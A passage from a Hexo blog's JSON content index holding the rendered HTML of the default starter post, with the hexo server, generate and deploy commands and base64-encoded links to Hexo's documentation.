data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": [
                "测试"
            ]
        }
    ]
}